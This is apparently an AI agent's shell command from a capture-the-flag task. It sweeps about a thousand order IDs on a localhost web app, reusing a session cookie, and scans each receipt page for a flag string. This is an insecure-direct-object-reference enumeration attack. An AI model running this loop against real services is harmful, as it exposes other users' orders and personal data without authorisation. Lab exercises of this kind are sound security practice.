args.cmd:
bash -lc '
for id in $(seq 299800 300800); do 
  body=$(curl -s -b /tmp/cjar http://localhost:80/order/$id/receipt);
  if echo "$body" | grep -qiE "flag\{|ctf\{"; then 
    echo "\n==== HIT at ID $id ====";
    echo "$body" | sed -n '1,200p';
    break;
  fi;
  # brief progress indicator every 50 ids
  if [ $((id % 50)) -eq 0 ]; then echo -n "." 1>&2; fi
  sleep 0.02;
done
'
